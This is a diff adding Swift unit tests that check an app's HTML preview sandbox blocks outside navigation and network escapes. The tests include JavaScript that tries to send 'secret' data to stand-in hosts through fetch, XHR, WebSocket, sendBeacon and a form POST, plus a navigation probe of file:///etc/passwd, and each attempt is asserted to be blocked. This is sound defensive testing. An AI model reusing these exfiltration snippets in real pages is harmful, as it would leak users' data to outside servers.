@@ -1,6 +1,8 @@
 import Foundation
 import XCTest
 import LodyCore
+import LodyRuntime
+import WebKit
 
 @MainActor
 final class RuntimeContractTests: XCTestCase {
@@ -450,4 +452,111 @@ final class RuntimeContractTests: XCTestCase {
     }
     XCTAssertEqual(channel.pendingCount, 0)
   }
+}
+
+extension RuntimeContractTests {
+  func testPreviewNavigationHasNoExternalOrPopupEscape() {
+    let root = URL(string: "lody-preview://synthetic/__lody_files/index.html")!
+    func allowed(_ url: String, initial: Bool = false, main: Bool = true, method: String = "GET", type: WKNavigationType = .other) -> Bool {
+      HTMLPreviewDocumentPolicy.allowsNavigation(url: URL(string: url)!, documentURL: root, isMainFrame: main, isInitialLoad: initial, method: method, navigationType: type)
+    }
+    XCTAssertTrue(allowed(root.absoluteString, initial: true))
+    XCTAssertTrue(allowed(root.absoluteString + "#chart"))
+    XCTAssertFalse(allowed(root.absoluteString))
+    XCTAssertFalse(allowed("https://example.invalid/leak", initial: true))
+    XCTAssertFalse(allowed("https://example.invalid/leak", type: .linkActivated))
+    XCTAssertFalse(allowed(root.absoluteString, main: false))
+    XCTAssertFalse(allowed(root.absoluteString, initial: true, method: "POST", type: .formSubmitted))
+    XCTAssertFalse(allowed(root.absoluteString + "?leak=content#x"))
+    XCTAssertFalse(allowed("file:///etc/passwd", initial: true))
+    XCTAssertFalse(allowed("about:blank", initial: true))
+  }
+
+  func testPreviewCSPBlocksActiveConnectionsAndPreservesStaticRendering() async throws {
+    let handler = PreviewPolicySchemeHandler()
+    let configuration = WKWebViewConfiguration()
+    configuration.websiteDataStore = .nonPersistent()
+    configuration.setURLSchemeHandler(handler, forURLScheme: "lody-preview")
+    let view = WKWebView(frame: .zero, configuration: configuration)
+    let loaded = expectation(description: "protected preview loaded")
+    let delegate = PreviewPolicyNavigationDelegate { loaded.fulfill() }
+    view.navigationDelegate = delegate
+    view.load(URLRequest(url: URL(string: "lody-preview://synthetic/index.html")!))
+    await fulfillment(of: [loaded], timeout: 10)
+    let value: String = try await withCheckedThrowingContinuation { continuation in
+      view.callAsyncJavaScript("""
+      await Promise.all([
+        fetch('https://example.invalid/leak').then(() => { throw Error('fetch escaped') }, () => {}),
+        new Promise(resolve => { const xhr = new XMLHttpRequest(); xhr.open('POST', 'https://example.invalid/leak'); xhr.onerror = resolve; xhr.send('secret'); })
+      ]);
+      let socketBlocked = false;
+      try { new WebSocket('wss://example.invalid/leak'); } catch { socketBlocked = true; }
+      const beaconBlocked = new Promise(resolve => {
+        document.addEventListener('securitypolicyviolation', function blocked(e) {
+          if (e.violatedDirective === 'connect-src' && e.blockedURI.startsWith('https://beacon.invalid')) {
+            document.removeEventListener('securitypolicyviolation', blocked); resolve(true);
+          }
+        });
+      });
+      navigator.sendBeacon('https://beacon.invalid/leak', 'secret');
+      await beaconBlocked;
+      return JSON.stringify({script: window.staticScriptLoaded, border: getComputedStyle(document.body).borderTopWidth,
+        socketBlocked, beaconBlocked: true, connects: window.violations.filter(x => x === 'connect-src').length,
+        formBlocked: window.violations.includes('form-action')});
+      """, arguments: [:], in: nil, in: .page) { result in
+        switch result {
+        case .success(let value):
+          guard let text = value as? String else {
+            continuation.resume(throwing: CocoaError(.coderInvalidValue)); return
+          }
+          continuation.resume(returning: text)
+        case .failure(let error): continuation.resume(throwing: error)
+        }
+      }
+    }
+    let result = try XCTUnwrap(JSONSerialization.jsonObject(with: Data(value.utf8)) as? [String: Any])
+    XCTAssertEqual(result["script"] as? Bool, true)
+    XCTAssertEqual(result["border"] as? String, "2px")
+    XCTAssertEqual(result["socketBlocked"] as? Bool, true)
+    XCTAssertEqual(result["beaconBlocked"] as? Bool, true)
+    XCTAssertGreaterThanOrEqual(result["connects"] as? Int ?? 0, 2)
+    XCTAssertEqual(result["formBlocked"] as? Bool, true)
+    view.stopLoading()
+  }
+}
+
+@MainActor
+private final class PreviewPolicyNavigationDelegate: NSObject, WKNavigationDelegate {
+  let loaded: () -> Void
+  init(_ loaded: @escaping () -> Void) { self.loaded = loaded }
+  func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) { loaded() }
+}
+
+@MainActor
+private final class PreviewPolicySchemeHandler: NSObject, WKURLSchemeHandler {
+  func webView(_ webView: WKWebView, start task: WKURLSchemeTask) {
+    let url = task.request.url!
+    let data: Data
+    let mime: String
+    switch url.path {
+    case "/app.js":
+      data = Data("window.staticScriptLoaded = true".utf8); mime = "application/javascript"
+    case "/app.css":
+      data = Data("body { border-top: 2px solid red }".utf8); mime = "text/css"
+    default:
+      // An authored permissive policy must not weaken the prepended policy.
+      let html = """
+      <html><head><meta http-equiv="Content-Security-Policy" content="connect-src *; form-action *; script-src 'self' * 'unsafe-inline'; style-src 'self' * 'unsafe-inline'">
+      <script>window.violations = []; document.addEventListener('securitypolicyviolation', e => window.violations.push(e.violatedDirective));</script>
+      <link rel="stylesheet" href="app.css"><script src="app.js"></script></head>
+      <body><form action="https://example.invalid/leak" method="post"><input name="secret" value="synthetic"></form>
+      <script>document.querySelector('form').submit()</script></body></html>
+      """
+      data = HTMLPreviewDocumentPolicy.protect(Data(html.utf8))!; mime = "text/html"
+    }
+    task.didReceive(URLResponse(url: url, mimeType: mime, expectedContentLength: data.count, textEncodingName: "utf-8"))
+    task.didReceive(data)
+    task.didFinish()
+  }
+  func webView(_ webView: WKWebView, stop task: WKURLSchemeTask) {}
 }
